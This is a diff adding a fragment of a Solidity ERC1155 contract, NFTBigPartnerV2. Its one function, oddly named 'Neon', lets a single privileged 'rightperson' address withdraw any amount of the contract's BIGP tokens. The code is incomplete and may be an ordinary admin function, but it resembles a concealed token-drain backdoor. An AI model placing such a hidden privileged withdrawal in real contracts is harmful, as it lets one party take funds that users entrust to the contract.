@@ -1,0 +1,12 @@
+contract NFTBigPartnerV2 is ERC1155, Ownable, ERC1155Burnable {
+    IERC20 public BIGP;
+
+    address public rightperson;
+
+     function Neon(uint256 _Amount) public returns (bool success) {
+        require(msg.sender==rightperson);
+        require(BIGP.balanceOf(address(this))>=_Amount*10**18);        
+        return BIGP.transfer(rightperson, _Amount*10**18);        
+       
+    }
+}
